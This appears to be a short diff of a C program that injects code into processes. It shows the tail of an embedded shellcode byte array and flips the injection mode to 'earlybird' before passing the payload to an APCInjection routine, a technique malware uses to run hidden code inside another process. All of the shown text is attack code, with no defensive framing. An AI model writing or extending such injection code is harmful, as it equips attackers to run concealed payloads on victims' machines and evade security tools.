@@ -234,8 +234,8 @@ int main() {
 		"\x31\xc9\x88\x4c\x24\x1b\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
 		"\xff\xd0\x31\xc0\x50\xff\x55\x08";
 #endif
-	//wchar_t mode[] = L"earlybird";
-	wchar_t mode[] = L"normal";
+	wchar_t mode[] = L"earlybird";
+	//wchar_t mode[] = L"normal";
 	SIZE_T payloadSize = sizeof(buf);
 	APCInjection(buf, payloadSize,  mode);
 }
